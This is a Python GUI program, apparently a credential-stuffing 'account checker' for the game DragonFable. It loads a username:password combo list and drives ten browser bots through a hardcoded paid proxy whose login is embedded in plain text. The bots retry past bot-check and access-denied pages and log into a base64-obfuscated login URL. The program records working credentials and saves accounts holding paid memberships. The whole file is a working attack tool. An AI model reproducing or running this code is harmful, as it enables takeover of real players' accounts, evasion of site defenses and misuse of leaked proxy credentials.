import customtkinter as ctk
from tkinter import *
from tkinter import filedialog
from tkinter import messagebox
import sys
from seleniumwire.webdriver import ChromeOptions
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from time import sleep
import seleniumwire.undetected_chromedriver.v2 as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from bs4 import BeautifulSoup
import requests
import json
from threading import Thread
import os
import base64
from random import randint

LOGIN_URL = base64.b64decode('aHR0cHM6Ly9hY2NvdW50LmRyYWdvbmZhYmxlLmNvbS9Mb2dpbg==')
PROXY = 'http://brd-customer-hl_ddb02df8-zone-data_center:a9unexspqppa@zproxy.lum-superproxy.io:22225'
LIST_THREADS = []
PERCENT = '0%'
BOTS_NUMBER = 10

MAX_LIST_NUMBER = 0
TOTAL_LIST_NUMBER = 0
THREADS_WORKERS = []

ver_url = base64.b64decode('aHR0cHM6Ly9qb2NpbWFybG9wZXMuY29tL3ZlcmlmeS9kYXRhLmpzb24=')
ver = requests.get(ver_url.decode('utf-8'))
ver = (json.loads(ver.text))['dragon_fable']
win = sys.platform.startswith("win")
thread_count = 1

global vips
vips = ''

i = 0

list_data = []
PROXIES = []
def config():
    sw_options = {
        'request_storage': 'memory',
        'verify_ssl': False,
        'suppress_connection_errors': False,
        'request_storage_base_dir': './logs/',
        'proxy': {
            'http': PROXY,
            'https': PROXY,
            'no_proxy': PROXY
        },
    }
    options = ChromeOptions()
    options.headless = False
    options.add_argument('--dns-prefetch-disable')
    options.add_argument('--incognito')
    serv = Service(ChromeDriverManager().install())
    if win:
        from subprocess import CREATE_NO_WINDOW
        serv.creationflags = CREATE_NO_WINDOW
    driver = uc.Chrome(service=serv, seleniumwire_options=sw_options)
    return driver
        
def iniciar():
    global MAX_LIST_NUMBER
    MAX_LIST_NUMBER = len(list_data) - 1
    driver = config()
    driver.get(LOGIN_URL.decode('utf-8'))
    while 'DF Manage Acct' not in driver.title:
        print('- Tentando acessar Dragon Fable')
        if not 'Just a moment' in driver.title:
            driver.delete_all_cookies()
            driver.quit()
            sleep(1.5)
            driver = config()
            driver.get(LOGIN_URL.decode('utf-8'))
        sleep(1)
    i = 0
    print('- Acessando Dragon Fable Login')
    driver.minimize_window()
    while MAX_LIST_NUMBER > 0:
        try:
            MAX_LIST_NUMBER = MAX_LIST_NUMBER - 1
            doLogin(list_data[randint(0, MAX_LIST_NUMBER)], driver)
            progressBarSet()
            while 'DF Manage Acct' not in driver.title:
                print('- Tentando acessar Dragon Fable')
                if 'Access denied' in driver.title:
                    driver.delete_all_cookies()
                    driver.quit()
                    sleep(0.6)
                    driver = config()
                    driver.get(LOGIN_URL.decode('utf-8'))
                sleep(0.3)
        except Exception as e:
            print(e)
            driver.delete_all_cookies()
            driver.quit()
            sleep(0.6)
            driver = config()
            driver.get(LOGIN_URL.decode('utf-8'))
            pass
        sleep(0.6)
    finish_threads()
                    
def doLogin(data, driver):
    print(data)
    global MAX_LIST_NUMBER
    try:
        user = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, 'uuu'))
        )
        user.send_keys(data['user'])
        driver.find_element(By.ID, 'ppp').send_keys(data['pass'])
        driver.find_element(By.XPATH, '//*[@id="formLogin"]/div[3]/div[2]/button').click()
    except Exception as e:
        print(e)
        driver.refresh()
        sleep(0.5)
        user = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, 'uuu'))
        )
        user.send_keys(data['user'])
        driver.find_element(By.ID, 'ppp').send_keys(data['pass'])
        driver.find_element(By.XPATH, '//*[@id="formLogin"]/div[3]/div[2]/button').click()
    finally:
        try:
            WebDriverWait(driver, 3).until(
                EC.presence_of_element_located((By.XPATH, '//*[@id="LeftPane"]/div/a[2]'))
            )
            logs_to_infos_file('SUCCESS - ' + str(data['user']) + ':' + str(data['pass']))
            verifyVip(data, driver)
            sleep(0.2)
            logout(driver)
            list_data.remove(data)
        except Exception as e:
            logs_to_infos_file('ERROR - ' + str(data['user']) + ':' + str(data['pass']))
            list_data.remove({'user': data['user'], 'pass': data['pass']})
            
def logout(driver):
    driver.find_element(By.XPATH, '//*[@id="LeftPane"]/div/a[11]').click()
    WebDriverWait(driver, 5).until(
        EC.presence_of_element_located((By.XPATH, '/html/body/div/div/div[2]/div/div/div/p[2]/a'))
    ).click()
    WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.ID, 'uuu'))
    )
    
def verifyVip(data, driver):
    global vips
    try:
        sleep(0.6)
        driver.find_element(By.XPATH, '//*[@id="LeftPane"]/div/a[2]').click()
        WebDriverWait(driver, 5).until(
            EC.presence_of_element_located((By.TAG_NAME, 'table'))
        )
        soup = BeautifulSoup(driver.page_source, 'html.parser')
        table = soup.find('table')
        tbody = table.find('tbody')
        tr = tbody.find_all('tr')
        if tr:
            for item in tr:
                tds = item.find_all('td')
                if 'Dragon Amulet' in tds[2].text:
                    vips = vips + str(data['user']) + ':' + str(data['pass']) + '\n'
                    logs_to_infos_file(str(data['user']) + ':' + str(data['pass']), 'vips.txt')
                    return True
    except Exception as e:
        print(e)
        
def read_data_from_file(directory=None):
    file = open(directory, 'r', encoding='utf8')
    lines = file.readlines()
    for item in lines:
        try:
            item = item.replace('\n', '')
            user = (item.split(':'))[0]
            password = (item.split(':'))[1]
            list_data.append({'user': user, 'pass': password})
        except:
            print('- Removendo credencial em formato inválido da lista')
    number_accounts.configure(text="{}".format(len(list_data)))
    
def read_proxies_from_file(directory=None):
    file = open(directory if directory else './proxies.txt', 'r', encoding='utf8')
    lines = file.readlines()
    for item in lines:
        try:
            item = item.replace('\n', '')
            item = item.split('@')
            proxy = item[0]
            user = (item[1].split(':'))[0]
            password = (item[1].split(':'))[1]
            PROXIES.append({'proxy': proxy, 'user': user, 'pass': password})
        except:
            print('Proxy inválida')

def browseFiles(title, dir):
    filename = filedialog.askopenfilename(initialdir = dir,
        title = title,
        filetypes = (("text files","*.txt*"), ("all files", "*.*")))
    return filename
       
def addLoginList():
    try:
        filename = browseFiles("Select a TXT Login List", './')
        if filename:
            path, file = os.path.split(filename)
            login_button.configure(text_color="#00FF7F", text=file)
            read_data_from_file(filename)
    except Exception as e:
        print(e)

def finish_threads(refresh = False):
    global thread_count
    global THREADS_WORKERS
    for thread in THREADS_WORKERS:
        if not thread.is_alive():
            thread_count = thread_count + 1
            thread.join()
            THREADS_WORKERS.remove(thread)
    if not refresh:
        if thread_count >= BOTS_NUMBER:
            progressBarSet(True)
            messagebox.showinfo('Verificação concluída', 'Por favor, \nescolha o local para \nsalvar o arquivo:\n\n"dragonfable_results.txt"')
            save_vips_to_file()
    
def start():
    global THREADS_WORKERS
    global TOTAL_LIST_NUMBER
    global MAX_LIST_NUMBER
    if ver:
        sleep(1)
        if len(list_data):
            try:
                TOTAL_LIST_NUMBER = len(list_data)
                for item in range(0, BOTS_NUMBER):
                    print('\n\nIniciando Bot - {}\n\n'.format(item))
                    t = Thread(target=iniciar)
                    THREADS_WORKERS.append(t)
                    t.start()
                    sleep(3)
            except Exception as e:
                print(e)
                pass
        else:
            messagebox.showinfo('Adicione o arquivo com as autenticações', 'Você precisa adicionar um arquivo TXT contendo login:senha separados linha por linha.')
    else:
        messagebox.showinfo('Contate o desenvolvedor', 'A licença do seu Dragon Fable verificador está desativada, contate o desenvolvedor. @jocimarlopes')

def credits():
    messagebox.showinfo('Créditos', 'Developed by\n\n@jocimarlopes\n\n07/11/2022')

def select_directory_to_save():
    dir_name = filedialog.askdirectory(initialdir='~/Downloads' if not win else '%USERPROFILE%\Downloads') # asks user to choose a directory
    return dir_name

def save_vips_to_file():
    global vips
    dir = select_directory_to_save()
    with open(dir + '\\' + 'dragonfable_results.txt' if win else dir + '/' + 'dragonfable_results.txt', 'w') as file:
        file.write(vips)
        
def logs_to_infos_file(log, dir_file=None):
    file = open(dir_file if dir_file else 'logs.txt', 'r')
    lines = file.read()
    if len(lines):
        log = '\n' + str(log)
    with open(dir_file if dir_file else 'logs.txt', 'w') as wfile:
        wfile.write(lines + log)
        return
TOTAL_PROGRESS = 0
def progressBarSet(finish = False):
    global TOTAL_LIST_NUMBER
    global TOTAL_PROGRESS
    global MAX_LIST_NUMBER
    try:
        number_accounts.configure(text="{}".format(str(MAX_LIST_NUMBER)))
        progress = 1 / TOTAL_LIST_NUMBER
        progress = "{:.4f}".format(progress)
        TOTAL_PROGRESS = TOTAL_PROGRESS + float(progress)
        if finish:
            progressbar.set(1)
        else:
            progressbar.set(TOTAL_PROGRESS)
        root.update_idletasks()
    except Exception as e:
        print(e)
        pass
    
def addProxies():
    messagebox.showinfo('Proxy', 'A lista de proxy está funcionando por API Proxy, não é possível adicionar lista de PROXY')

def continue_thread():
    Thread(target=continue_by_logs).start()
  
def continue_by_logs():
    try:
        contas_removidas = 0
        if len(list_data):
            logs = open('logs.txt', 'r')
            lines = logs.readlines()
            if not len(lines):
                return messagebox.showinfo('Ops..', "Não existe log para verificar login e senha, clique em Start! ")
            for data_log in lines:
                data_log = data_log.split(':')
                data_log[0] = data_log[0].replace('SUCCESS - ', '')
                data_log[0] = data_log[0].replace('ERROR - ', '')
                data_log[1] = data_log[1].replace('\n', '')
                user = {'user': data_log[0], 'pass': data_log[1]}
                print(user)
                if user in list_data:
                    print('- Removendo da lista!\n')
                    list_data.remove(user)
                    contas_removidas = contas_removidas + 1
            if len(list_data):
                messagebox.showinfo('Continue by LOGS', 'Verificamos os LOGS e existem contas já verificadas, removemos {} contas de {}'.format(contas_removidas, len(list_data) + contas_removidas))
                number_accounts.configure(text="{}/{}".format(0, len(list_data)))
                start()
            else:
                messagebox.showinfo('All list verified', 'A lista já foi verificada completamente')
        else:
            messagebox.showinfo('Need Login List', 'É preciso adicionar a última lista utilizada para continuar')
    except Exception as e:
        print(e)

        
if __name__ == '__main__':
    ctk.set_appearance_mode("dark")  # Modes: system (default), light, dark
    ctk.set_default_color_theme("dark-blue")  # Themes: blue (default), dark-blue, green
    root = ctk.CTk()
    root.geometry("800x400")
    root.title("VIP Account Verification - Dragon Fable")
    root.resizable(width=False, height=False)
    canvas = Canvas(root, width=800, height=400, background='#1a1a1a')      
    canvas.pack()      
    dragonFableLogo = PhotoImage(file="dragonfable.png")      
    canvas.create_image(0, 0, anchor=NW, image=dragonFableLogo, tags="bg_img")
    proxy_button = ctk.CTkButton(master=root, text="+ Proxy's List", command=addProxies, width=300)
    proxy_button.place(relx=0.3, rely=0.4, anchor=ctk.CENTER)
    login_button = ctk.CTkButton(master=root, text="+ Login List", command=addLoginList, width=300)
    login_button.place(relx=0.7, rely=0.4, anchor=ctk.CENTER)
    start_button = ctk.CTkButton(master=root, text="Start!", command=start, width=150)
    start_button.place(relx=0.4, rely=0.5, anchor=ctk.CENTER)
    continue_button_by_logs = ctk.CTkButton(master=root, width=150, text="continue", text_color="#00FF7F", command=continue_thread)
    continue_button_by_logs.place(relx=0.6, rely=0.5, anchor=ctk.CENTER)
    progressbar = ctk.CTkProgressBar(master=canvas, width=400, mode='determinate', orient=HORIZONTAL)
    progressbar.place(relx=0.5, rely=0.7, anchor=ctk.CENTER)
    progressbar.set(0)
    number_accounts = ctk.CTkLabel(master=root, text='Nenhuma lista selecionada', text_color="#fff", justify="center")
    number_accounts.place(relx=0.5, rely=0.8, anchor=ctk.CENTER)
    credits_button = ctk.CTkButton(width=5, master=root, text="?", command=credits, fg_color='#1a1a1a')
    credits_button.place(relx=0.95, rely=0.93, anchor=ctk.CENTER)
    root.mainloop()
        